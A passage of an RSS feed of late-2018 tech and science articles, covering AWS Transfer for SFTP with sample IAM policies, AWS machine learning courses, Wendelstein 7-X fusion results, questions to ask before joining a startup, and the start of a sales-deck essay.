            &quot;Resource&quot;: &quot;*&quot;
        },
        {
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Action&quot;: &quot;s3:ListBucket&quot;,
            &quot;Resource&quot;: &quot;arn:aws:s3:::data-transfer-inbound&quot;
        },
        {
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Action&quot;: &quot;s3:*&quot;,
            &quot;Resource&quot;: &quot;arn:aws:s3:::data-transfer-inbound/jeff/*&quot;
        }
    ]
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If I plan to host lots of users on the same server, I can make use of a &lt;a href=&quot;https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_control-access_assumerole.html&quot;&gt;scope-down&lt;/a&gt; policy that looks like this:&lt;/p&gt;
&lt;div class=&quot;hide-language&quot; readability=&quot;27&quot;&gt;
&lt;pre class=&quot;unlimited-height-code&quot;&gt;
&lt;code class=&quot;lang-json&quot;&gt;{
    &quot;Version&quot;: &quot;2012-10-17&quot;,
    &quot;Statement&quot;: [
        {
            &quot;Sid&quot;: &quot;ListHomeDir&quot;,
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Action&quot;: &quot;s3:ListBucket&quot;,
            &quot;Resource&quot;: &quot;arn:aws:s3:::${transfer:HomeBucket}&quot;
        },
        {
            &quot;Sid&quot;: &quot;AWSTransferRequirements&quot;,
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Action&quot;: [
                &quot;s3:ListAllMyBuckets&quot;,
                &quot;s3:GetBucketLocation&quot;
            ],
            &quot;Resource&quot;: &quot;*&quot;
        },
        {
            &quot;Sid&quot;: &quot;HomeDirObjectAccess&quot;,
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Action&quot;: [
                &quot;s3:PutObject&quot;,
                &quot;s3:GetObject&quot;,
                &quot;s3:DeleteObjectVersion&quot;,
                &quot;s3:DeleteObject&quot;,
                &quot;s3:GetObjectVersion&quot;
            ],
            &quot;Resource&quot;: &quot;arn:aws:s3:::${transfer:HomeDirectory}*&quot;
        }
    ]
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;${transfer:HomeBucket}&lt;/code&gt; and &lt;code&gt;${transfer:HomeDirectory}&lt;/code&gt; policy variables will be set to appropriate values for each user when the scope-down policy is evaluated; this allows me to use the same policy, suitably customized, for each user.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Things to Know&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;Here are a couple of things to keep in mind regarding &lt;span title=&quot;&quot;&gt;AWS Transfer for SFTP&lt;/span&gt;:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Programmatic Access&lt;/strong&gt; – A full set of APIs and CLI commands is also available. For example, I can create a server with one simple command:&lt;/p&gt;
&lt;div class=&quot;hide-language&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;unlimited-height-code&quot;&gt;
&lt;code class=&quot;lang-bash&quot;&gt;$ aws transfer create-server --identity-provider-type SERVICE_MANAGED 
-------------------------------------
|           CreateServer            |
+-----------+-----------------------+
|  ServerId |  s-b445dcff7f164c73a  |
+-----------+-----------------------+
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There are many other commands including &lt;code&gt;list-servers&lt;/code&gt;, &lt;code&gt;start-server&lt;/code&gt;, &lt;code&gt;stop-server&lt;/code&gt;, &lt;code&gt;create-user&lt;/code&gt;, and &lt;code&gt;list-users&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CloudWatch &lt;/strong&gt; – Each server can optionally send detailed access logs to &lt;a href=&quot;https://aws.amazon.com/cloudwatch/&quot; title=&quot;&quot;&gt;Amazon CloudWatch&lt;/a&gt;. There’s a separate log stream for each SFTP session and one more for authentication errors:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium&quot; src=&quot;https://media.amazonwebservices.com/blog/2018/ts_cw_logs_1.png&quot; width=&quot;700&quot; height=&quot;341&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Alternate Identity Providers&lt;/strong&gt; – I showed you the built-in user management above. You can also access an alternate identity provider that taps into your existing LDAP or Active Directory.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pricing&lt;/strong&gt; – You pay a per-hour fee for each running server and a per-GB data upload and download fee.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Available Now&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span title=&quot;&quot;&gt;AWS Transfer for SFTP&lt;/span&gt; is available today in &lt;span title=&quot;&quot;&gt;US East (N. Virginia)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;US East (Ohio)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;US West (Oregon)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;US West (N. California)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Canada (Central)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Europe (Ireland)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Europe (Paris)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Europe (Frankfurt)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Europe (London)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Asia Pacific (Tokyo)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Asia Pacific (Singapore)&lt;/span&gt;, &lt;span title=&quot;&quot;&gt;Asia Pacific (Sydney)&lt;/span&gt;, and &lt;span title=&quot;&quot;&gt;Asia Pacific (Seoul)&lt;/span&gt; Regions.&lt;/p&gt;
&lt;p&gt;— &lt;a href=&quot;https://twitter.com/jeffbarr&quot;&gt;Jeff&lt;/a&gt;;&lt;/p&gt;
</description>
<pubDate>Mon, 26 Nov 2018 16:13:21 +0000</pubDate>
<dc:creator>el_duderino</dc:creator>
<og:title>New – AWS Transfer for SFTP – Fully Managed SFTP Service for Amazon S3 | Amazon Web Services</og:title>
<og:type>article</og:type>
<og:url>https://aws.amazon.com/blogs/aws/new-aws-transfer-for-sftp-fully-managed-sftp-service-for-amazon-s3/</og:url>
<og:description>Many organizations use SFTP (Secure File Transfer Protocol) as part of long-established data processing and partner integration workflows. While it would be easy to dismiss these systems as “legacy,” the reality is that they serve a useful purpose and will continue to do so for quite some time. We want to help our customers to […]</og:description>
<og:image>https://d2908q01vomqb2.cloudfront.net/da4b9237bacccdf19c0760cab7aec4a8359010b0/2018/11/19/ts_con_main_1.png</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://aws.amazon.com/blogs/aws/new-aws-transfer-for-sftp-fully-managed-sftp-service-for-amazon-s3/</dc:identifier>
</item>
<item>
<title>Amazon’s own ‘Machine Learning University’ now available to all developers</title>
<link>https://aws.amazon.com/blogs/machine-learning/amazons-own-machine-learning-university-now-available-to-all-developers/</link>
<guid isPermaLink="true" >https://aws.amazon.com/blogs/machine-learning/amazons-own-machine-learning-university-now-available-to-all-developers/</guid>
<description>&lt;p&gt;Today, I’m excited to share that, for the first time, the same machine learning courses used to train engineers at Amazon are now available to all developers through AWS.&lt;/p&gt;&lt;p&gt;We’ve been using machine learning across Amazon for more than 20 years. With thousands of engineers focused on machine learning across the company, there are very few Amazon retail pages, products, fulfillment technologies, stores which haven’t been improved through the use of machine learning in one way or another. Many AWS customers share this enthusiasm, and our mission has been to take machine learning from something which had previously been only available to the largest, most well-funded technology companies, and put it in the hands of every developer. Thanks to services such as Amazon SageMaker, Amazon Rekognition, Amazon Comprehend, Amazon Transcribe, Amazon Polly, Amazon Translate, and Amazon Lex, tens of thousands of developers are already on their way to building more intelligent applications through machine learning.&lt;/p&gt;
&lt;p&gt;Regardless of where they are in their machine learning journey, one question I hear frequently from customers is: “how can we accelerate the growth of machine learning skills in our teams?” These courses, available as part of a new AWS Training and Certification Machine Learning offering, are now part of my answer.&lt;/p&gt;
&lt;p&gt;There are more than 30 self-service, self-paced digital courses with more than 45 hours of courses, videos, and labs for four key groups: developers, data scientists, data platform engineers, and business professionals. Each course starts with the fundamentals, and builds on those through real-world examples and labs, allowing developers to explore machine learning through some fun problems we have had to solve at Amazon. These include predicting gift wrapping eligibility, optimizing delivery routes, or predicting entertainment award nominations using data from IMDb (an Amazon subsidiary). Coursework helps consolidate best practices, and demonstrates how to get started on a range of AWS machine learning services, including Amazon SageMaker, AWS DeepLens, Amazon Rekognition, Amazon Lex, Amazon Polly, and Amazon Comprehend.&lt;/p&gt;
&lt;h2&gt;New AWS Certification for Machine Learning&lt;/h2&gt;
&lt;p&gt;To help developers demonstrate their knowledge (and to help employers hire more efficiently), we are also announcing the new “AWS Certified Machine Learning – Specialty” certification. Customers can take the exam now (and at half price for a limited time). Customers at re:Invent can sit for the exam this week at our Training and Certification exam sessions.&lt;/p&gt;
&lt;p&gt;The digital courses are now available at no charge at &lt;a href=&quot;https://aws.training/machinelearning&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;aws.training/machinelearning&lt;/a&gt; and you only pay for the services you use in labs and exams during your training.&lt;/p&gt;

&lt;p&gt;–&lt;strong&gt;Dr. Matt Wood&lt;/strong&gt;, General Manager of Artificial Intelligence, AWS&lt;/p&gt;




</description>
<pubDate>Mon, 26 Nov 2018 15:54:07 +0000</pubDate>
<dc:creator>ydereky</dc:creator>
<og:title>Amazon’s own ‘Machine Learning University’ now available to all developers | Amazon Web Services</og:title>
<og:type>article</og:type>
<og:url>https://aws.amazon.com/blogs/machine-learning/amazons-own-machine-learning-university-now-available-to-all-developers/</og:url>
<og:description>Today, I’m excited to share that, for the first time, the same machine learning courses used to train engineers at Amazon are now available to all developers through AWS. We’ve been using machine learning across Amazon for more than 20 years. With thousands of engineers focused on machine learning across the company, there are very […]</og:description>
<og:image>https://d2908q01vomqb2.cloudfront.net/f1f836cb4ea6efb2a0b1b99f41ad8b103eff4b59/2017/11/21/Social_Graphics_1.png</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://aws.amazon.com/blogs/machine-learning/amazons-own-machine-learning-university-now-available-to-all-developers/</dc:identifier>
</item>
<item>
<title>Successful second round of fusion experiments with Wendelstein 7-X</title>
<link>https://www.ipp.mpg.de/4550215/11_18</link>
<guid isPermaLink="true" >https://www.ipp.mpg.de/4550215/11_18</guid>
<description>&lt;p class=&quot;h3 subtitle serif&quot;&gt;New stellarator record achieved / next upgrading phase begun according to plan&lt;/p&gt;


&lt;p class=&quot;summary&quot;&gt;The experiments conducted from July until November at the Wendelstein 7-X fusion device at the Max Planck Institute for Plasma Physics (IPP) in Greifswald have achieved higher values for the density and the energy content of the plasma and long discharge times of up to 100 seconds – record results for devices of the stellarator type. Meanwhile, the next round of the step-by-step upgrading of Wendelstein 7-X has begun. It is to equip the device for greater heating power and longer discharges. Wendelstein 7-X, the world’s largest fusion device of the stellarator type, is to investigate the suitability of this configuration for use in a power plant.&lt;/p&gt;

&lt;div class=&quot;mpg-image-frame-relative&quot;&gt;&lt;img alt=&quot;original&quot; class=&quot;img-responsive&quot; title=&quot;View inside the plasma vessel of the Wendelstein 7-X fusion device&quot; src=&quot;https://www.ipp.mpg.de/4550242/original-1543230147.jpg?t=eyJ3aWR0aCI6MzQwLCJvYmpfaWQiOjQ1NTAyNDJ9--0eda0a06bce2f22920523b8d5292131237378d18&quot;/&gt;
&lt;/div&gt;
&lt;img class=&quot;visible-print-block mb-1 banner&quot; src=&quot;https://www.ipp.mpg.de/4550242/original-1543230147.jpg?t=eyJ3aWR0aCI6MjQ2LCJvYmpfaWQiOjQ1NTAyNDJ9--bf52977712177090f8d45ab74e5c34eb717cadbc&quot; alt=&quot;Original 1543230147&quot;/&gt;&lt;div class=&quot;description&quot; id=&quot;description_4550228&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;View inside the plasma vessel of the Wendelstein 7-X fusion device&lt;/p&gt;
&lt;/div&gt;
&lt;p class=&quot;copyright&quot; id=&quot;copyright_4550228&quot;&gt;Photo: IPP, Jan Michael Hosan&lt;/p&gt;
&lt;div class=&quot;description&quot; readability=&quot;7&quot;&gt;View inside the plasma vessel of the Wendelstein 7-X fusion device&lt;/div&gt;
&lt;p&gt;Photo: IPP, Jan Michael Hosan&lt;/p&gt;
&lt;p&gt;During the course of the step-by-step upgrading of Wendelstein 7-X, the plasma vessel was fitted with inner cladding since September of last year. Graphite tiles are now protecting the vessel walls. In addition, the so-called “divertor” is used to regulate the purity and density of the plasma. In ten broad strips on the wall of the plasma vessel, the divertor tiles follow the contour of the plasma edge. Specifically, they cover the wall areas on which the particles from the edge of the plasma are diverted in a targeted way. After three months of experiments with the new equipment, the next round of upgrades began at the end of 2017; among other things, new measuring devices and heating systems were installed. The experiments were resumed from July 2018 onwards.&lt;/p&gt;
&lt;p&gt;While the divertor had already demonstrated its good impact in the past (see &lt;a href=&quot;https://www.ipp.mpg.de/4413312/04_18?c=4313165&quot; target=&quot;_blank&quot;&gt;PI 4/2018&lt;/a&gt;), the plasma values with help of the extended plasma heating in combination with purified vessel walls could now be significantly increased. The newly installed neutral particle heating injects fast hydrogen atoms into the plasma, which transfer their energy to the plasma particles via collisions. The result was high plasma densities of up to 2 x 10&lt;sup&gt;20&lt;/sup&gt; particles per cubic meter – values that are sufficient for a future power station. At the same time, the ions and electrons of the hydrogen plasma reached an impressive temperature of 20 million degrees Celsius.&lt;/p&gt;

&lt;div class=&quot;mpg-image-frame-relative&quot;&gt;&lt;img alt=&quot;original&quot; class=&quot;img-responsive&quot; title=&quot;The record plasma with an energy content of over one megajoule&quot; src=&quot;https://www.ipp.mpg.de/4550362/original-1543230147.jpg?t=eyJ3aWR0aCI6MzQwLCJvYmpfaWQiOjQ1NTAzNjJ9--b992b5b907471d44bed2322ad5c1a0f8bd60967b&quot;/&gt;
&lt;/div&gt;
&lt;img class=&quot;visible-print-block mb-1 banner&quot; src=&quot;https://www.ipp.mpg.de/4550362/original-1543230147.jpg?t=eyJ3aWR0aCI6MjQ2LCJvYmpfaWQiOjQ1NTAzNjJ9--a5baa4154eea1785e18b9582d79331508bda9578&quot; alt=&quot;Original 1543230147&quot;/&gt;&lt;div class=&quot;description&quot; id=&quot;description_4550255&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;The record plasma with an energy content of over one megajoule&lt;/p&gt;
&lt;/div&gt;
&lt;p class=&quot;copyright&quot; id=&quot;copyright_4550255&quot;&gt;Photo: IPP, Wigner RCP&lt;/p&gt;
&lt;p&gt;The record plasma with an energy content of over one megajoule&lt;/p&gt;
&lt;p&gt;Photo: IPP, Wigner RCP&lt;/p&gt;
&lt;p&gt;Record stellarator values achieved Wendelstein 7-X for the energy stored in the plasma. By strong microwave heating, the energy content of the plasma exceeded one megajoule for the first time, without the vessel wall becoming too hot. With good plasma values, long lasting plasmas over durations of 100 seconds have been obtained – also one of the best stellarator values to date.&lt;/p&gt;
&lt;p&gt;These highly satisfying results attracted a great deal of attention at this year’s international conferences. Federal Research minister Anja Karliczek also commented on the results: “Congratulations to the Wendelstein 7-X team on the new world record. The approach is the right one – in this way, important new findings have been made for the future use of fusion power stations. Alongside renewables, fusion energy could be THE energy source of the future. The researchers in Greifswald have taken an important step in this direction with their work. I wish the team every success with their future work.”&lt;/p&gt;
&lt;p&gt;The final experiments were conducted in mid-October; in the meantime, the next round of upgrades on Wendelstein 7-X has begun. In order to be able to further increase the heating energy without overloading the vessel wall, the current graphite tiles of the divertor will be replaced over the next two years by water-cooled elements made of carbon fibre-reinforced carbon. With this equipment, work will be conducted on a step by step basis with the aim of achieving plasmas that last for 30 minutes. Then, it will remain to be seen whether Wendelstein 7-X can also fulfil its optimisation goals during continuous operation – the essential advantage of stellarators.  &lt;/p&gt;
&lt;h2&gt;Background&lt;/h2&gt;
&lt;p&gt;The goal of fusion research is to develop a climate- and environment-friendly power station. Like the sun, it is to derive energy from the fusion of atomic nuclei. Since the fusion fire only ignites at temperatures of over 100 million degrees, the fuel – a low-density hydrogen plasma – must not come into contact with cold vessel walls. Held by magnetic fields, it floats in an almost contact-free manner in the interior of a vacuum chamber.&lt;/p&gt;
&lt;p&gt;The magnetic cage of Wendelstein 7-X is generated by a ring of 50 superconductive magnetic coils which are about 3.5 meters high. Their specific forms are the result of elaborate optimisation calculations. Although Wendelstein 7-X is not designed to generate energy, the device is intended to prove that stellarators are suitable for use in power stations. With Wendelstein 7-X the intention is to achieve for the first time in a stellarator the quality of confinement afforded by competing devices of the tokamak type.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Isabella Milch&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 26 Nov 2018 15:35:53 +0000</pubDate>
<dc:creator>mrfusion</dc:creator>
<og:title>Successful second round of experiments with Wendelstein 7-X</og:title>
<og:description></og:description>
<og:type>website</og:type>
<og:url>https://www.ipp.mpg.de/4550215/11_18</og:url>
<og:image>https://www.ipp.mpg.de/4550362/original-1543230147.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.ipp.mpg.de/4550215/11_18</dc:identifier>
</item>
<item>
<title>Questions to Ask Before Joining a Startup</title>
<link>https://hharnisc.github.io/2018/11/25/twenty-questions-to-ask-before-joining-a-startup.html</link>
<guid isPermaLink="true" >https://hharnisc.github.io/2018/11/25/twenty-questions-to-ask-before-joining-a-startup.html</guid>
<description>&lt;p&gt;When I first joined a startup in 2012 I did my best to ask the right questions when interviewing. My engineering background prepared me for engineering tasks and helped me write a resume, but it didn’t prepare me well for how to evaluate a startup offer. While this might be obvious to some, this is what I wish I knew when trying to break into the startup scene.&lt;/p&gt;
&lt;h2 id=&quot;foundation&quot;&gt;Foundation&lt;/h2&gt;
&lt;p&gt;Making sure you’ve got what you need in your day to day is critical. Unless you are independently wealthy, &lt;strong&gt;don’t take a job that can’t cover cost of living or does not provide health insurance&lt;/strong&gt;. This means you need to spend some time to create your monthly budget (good to do this even if you aren’t interviewing). A good rule of thumb is 25% of take home pay should go towards housing and up to 40% in the Bay Area. 40% can be done if you minimize costs like going out or have a second income.&lt;/p&gt;
&lt;p&gt;If the job requires relocation it is very common for startups to offer relocation packages. I’ve moved across the country twice and it cost around $3000-$6000 for things like:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;relocation cubes (https://www.upack.com/)&lt;/li&gt;
&lt;li&gt;shipping a car (https://www.uship.com/vehicles/)&lt;/li&gt;
&lt;li&gt;if not shipping a car, hotel while traveling&lt;/li&gt;
&lt;li&gt;food while traveling&lt;/li&gt;
&lt;li&gt;hotel for a few nights while finding more permanent housing&lt;/li&gt;
&lt;li&gt;registration fees (license plate, sticker, etc.)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Both times we moved we packed ourselves, which we could do because we were both healthy 20 somethings. So adjust if you plan on hiring movers.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;1. What is the base yearly salary?
2. What are details of the health, eye and dental insurance plans?
3. Does the company offer relocation? (if you need it)
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;equity&quot;&gt;Equity&lt;/h2&gt;
&lt;p&gt;The amount of equity in the offer depends on experience and the stage of the company. This part of the guide will focus on options, since at the time of writing options are the most common way for startups to offer equity. &lt;a href=&quot;https://a16z.com/2016/08/24/options-ownership/&quot;&gt;Here’s an article on how options work&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The first goal is to understand the percentage of shares the company is offering. It is pretty common to get a written offer with the raw number of shares. While helpful, this is only part of the equation, since the number of shares doesn’t mean much if there are hundreds of millions of shares already issued.&lt;/p&gt;
&lt;p&gt;Here’s a nice formula from Buffer that shows one way of determining startup equity amounts: https://open.buffer.com/buffer-open-equity-formula/. This formula is helpful because it takes risk into account by considering the number of people in the company. The smaller the company the larger amount of risk, and a greater reward if things work out.&lt;/p&gt;
&lt;p&gt;Lets say you’re a relatively new engineer (2-3 years experience) and joining a company with less than 10 employees. A fair amount of equity would be likely be around 0.3% - 0.7%.&lt;/p&gt;
&lt;p&gt;In the recent years it has become more common for companies offer a 10 year exercise window on stock options. This means employees have 10 years to decide to buy or pass on stock options once they’ve vested, which is a great! However it is still pretty standard to see a 90 day exercise window. The effect is that after leaving the company, employees have to make the decision to buy or pass up on purchasing vested stock options. This could be a difficult choice for someone who doesn’t have much cash on hand. Companies that have shorter exercise windows end up benefiting the people who are present during an exit. Here’s some more information if you’re interested in learning more: https://blog.colony.io/on-creating-a-better-employee-equity-plan-d89bcab4a4e2/&lt;/p&gt;
&lt;p&gt;It is also important to note that early employees experience more dilution events. An example of a dilution event would be raising another round of funding. This is another reason why joining a company early should offer more equity. If you joining a company around a Series A raise, you can usually expect to see around 20% - 30% dilution.&lt;/p&gt;
&lt;p&gt;The next item to consider is the strike price, which is the purchase price for the options when they vest. The strike price is often determined by the board, so it might not be possible to get this before starting. What’s important about the strike price is that it is the starting point, so the company needs to grow for you to make money from selling options. If you can’t get the strike price, make sure you believe the company will grow. Early employees often get a better (lower) strike price, to compensate for the risk.&lt;/p&gt;
&lt;p&gt;After understanding the percentage of shares the company is offering and the number of issued shares, it is possible to get an idea of the potential value of the options. Here’s a helpful startup equity calculator: https://comp.data.frontapp.com/&lt;/p&gt;
&lt;p&gt;Most importantly, the majority of startups fail. The equity could be worth nothing, which is another reason why it is so important to have a strong foundation.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;4. How many total options are offered?
5. What is the total number of issued shares?
6. What is the vesting schedule?
7. What is the exercise window of vested options?
8. What is the strike price? (You might not get an answer to this one)
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;funding&quot;&gt;Funding&lt;/h2&gt;
&lt;p&gt;There are many factors in startup funding to consider. While getting information about cash on hand and burn rate are important, it is beneficial to understand who is investing along with some history on their past investments.&lt;/p&gt;
&lt;p&gt;Let’s start with the basics. Ask for total amount of funding, how much cash the company has on hand (preferably that day) and the burn rate. With this information you can get a picture of the scale the company is operating as well as how quickly they’re spending cash.&lt;/p&gt;
&lt;p&gt;After learning about operating costs and spending, dig into who has invested into the company. The investors can have a profound impact on the company culture and the direction of the company. Tools like &lt;a href=&quot;https://angel.co/&quot;&gt;AngelList&lt;/a&gt; and &lt;a href=&quot;https://www.crunchbase.com/&quot;&gt;Crunchbase&lt;/a&gt; provide information about previous investments. Individual investors can usually be found on LinkedIn.&lt;/p&gt;
&lt;p&gt;While it may seem a bit forward, ask if the company has failed to make payroll in the last year. If they have struggled to make payroll in the past, this makes choosing the startup a riskier venture and might be a signal that the founders are having trouble raising money.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;9. What is the total amount of funding raised?
10. How much cash is on hand?
11. What is the [burn rate](https://baremetrics.com/academy/burn-rate)?
12. What round of funding has the company raised?
13. Who has invested in the company?
14. In the last year has the company failed to make payroll?
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;board&quot;&gt;Board&lt;/h2&gt;
&lt;p&gt;Just like the investors, the board can have a huge impact on the direction of the company. Determining if the board is healthy for the company is difficult because it is highly subjective. Basically it comes down the deeply unsatisfying &lt;em&gt;it depends&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;When evaluating the board, look for an imbalance in power (or control). If an individual or closely connected group on the board can lock or overturn a decision themselves there is a higher chance that the board is unhealthy. A board with concentrated power is almost the same as an individual making all the decisions. Concentrated power is not objectively bad, especially if you know the people with control well and trust that they will do the right thing.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;15. Who is on the board of directors and how many seats does each member have?
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h2 id=&quot;responsibilities&quot;&gt;Responsibilities&lt;/h2&gt;
&lt;p&gt;A big perk of working at a startup is that the projects are high impact and the people are often at a high bar. There’s not much room to work on things that are unimportant to the business or for people who can’t pull their own weight. People often describe working at a startup like packing ten years into a single years worth of learning. Even if you’re a deep expert in a niche field, daily learning will be critical to get things done. Make sure the prospective projects are interesting and will take your career in the desired direction. If you’re not sure what direction to take your career, chose a role that will expose you to lots of different ideas you &lt;em&gt;might&lt;/em&gt; be interested in. It is not uncommon for someone to find something they love doing and become the person who &lt;em&gt;owns a set of problems or services&lt;/em&gt; related to that thing.&lt;/p&gt;
&lt;p&gt;Startups change at an accelerated pace and is typical for projects to get cancelled (sometimes before the first day!). To get a feel for how often things change, ask questions about &lt;a href=&quot;https://a16z.com/2017/02/18/12-things-about-product-market-fit/&quot;&gt;product market fit&lt;/a&gt;. It is critical that the company is working closely with customers to understand they are solving the right problem. Working with the customer can look like doing customer research, support forums (yes engineers do support sometimes at startups) or some other direct line of contact with the customer. If the company has already identified a product that fits the market, the engineering team is going to be solving whatever problems it needs to in order to build the product. If the company has not found a good fit yet, the focus will be on finding the right problem to solve. The process is commonly referred to as a &lt;a href=&quot;https://en.wikipedia.org/wiki/Lean_startup#Pivot&quot;&gt;pivot&lt;/a&gt; and will likely change the engineering team’s focus.&lt;/p&gt;
&lt;p&gt;After gaining insight on future projects the next step is to get to know potential teammates. Hopefully the company involves potential teammates in the the interview process so you can meet them and ask questions. If the company doesn’t do this you can usually ask to meet with them, especially if they extend you an offer. Consider it a red flag if they won’t let you speak to a potential co-worker. Keep in mind that you’ll be spending lots of time working with these people, so you’ll want to pretty sure that these are people who you can get along with. That’s not to say that everyone will be your new best friend, but there should be a mutual respect. This is one of those occasions where you get to choose who you surround yourself with, so make sure these are quality people. If you get a bad feeling about someone, trust your gut here, there are lots of other startups!&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;16. What projects do you picture I'd work on?
17. Has the company found product market fit?
18. How does the company collect feedback from customers?
19. Who would I be working with to complete the projects?
20. Ask each new potential teammate:
  1. What do you work on?
  2. What about your role are you enjoying?
  3. What could the company improve on?
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;hr /&gt;&lt;p&gt;&lt;em&gt;Technically&lt;/em&gt; there are 23 questions but I grouped the last one together as a question for new potential teammates. Also 23 questions to ask before joining a startup didn’t have as good a ring to it.&lt;/p&gt;
&lt;p&gt;I’d like to add a couple of notes before you go off and send this list of questions to potential employers. Try to get as many questions answered conversationally during the interview and save the unanswered questions for the end. It is ok to send a list of unanswered questions if time ran out during the interview.&lt;/p&gt;
&lt;p&gt;It is unlikely that the interviewers will be able to answer &lt;em&gt;every question&lt;/em&gt; for a number of different reasons, ranging from &lt;em&gt;don’t know&lt;/em&gt; to &lt;em&gt;I can’t answer that&lt;/em&gt;. It might be helpful to mark the questions that are important to you. For instance you might care a lot about &lt;code class=&quot;highlighter-rouge&quot;&gt;equity&lt;/code&gt; but not care as much about the &lt;code class=&quot;highlighter-rouge&quot;&gt;board&lt;/code&gt; structure since you know the founders very well.&lt;/p&gt;
&lt;p&gt;This is not the definitive list of questions for everyone but more of a generic starting point. If you took this list and added questions based off your personal experiences you’d be in a better position to pass or accept an offer than if you used only these questions.&lt;/p&gt;
&lt;p&gt;Finally, and most importantly, trust your gut. If you get to the interview and something feels off, it probably is. Just because a startup is doing well doesn’t mean they have their shit together. There are 1000s of startups to choose from and spending a little extra time to find the right one is worth the effort.&lt;/p&gt;
&lt;p&gt;Have some thoughts on this? Reach out to me on Twitter: &lt;a href=&quot;https://twitter.com/hjharnis&quot;&gt;@hjharnis&lt;/a&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 26 Nov 2018 14:35:49 +0000</pubDate>
<dc:creator>hharnisch</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://hharnisc.github.io/2018/11/25/twenty-questions-to-ask-before-joining-a-startup.html</dc:identifier>
</item>
<item>
<title>The greatest sales deck I&amp;#039;ve ever seen (2016)</title>
<link>https://medium.com/the-mission/the-greatest-sales-deck-ive-ever-seen-4f4ef3391ba0</link>
<guid isPermaLink="true" >https://medium.com/the-mission/the-greatest-sales-deck-ive-ever-seen-4f4ef3391ba0</guid>
<description>&lt;h2 name=&quot;c33b&quot; id=&quot;c33b&quot; class=&quot;graf graf--h4 graf-after--h3 graf--subtitle&quot;&gt;It’s Zuora’s, and it’s brilliant. Here’s why.&lt;/h2&gt;
&lt;p name=&quot;1120&quot; id=&quot;1120&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;A few months ago, my friend Tim took a new sales job at a Series C tech company that had raised over $60 million from A-list investors. He’s one of the best salespeople I know, but soon after starting, he emailed me to say he was struggling.&lt;/p&gt;
&lt;p name=&quot;c9c2&quot; id=&quot;c9c2&quot; class=&quot;graf graf--p graf--startsWithDoubleQuote graf-after--p&quot;&gt;“I’ve landed a few small accounts,” Tim said. “But my pitch falls flat at big enterprises.”&lt;/p&gt;
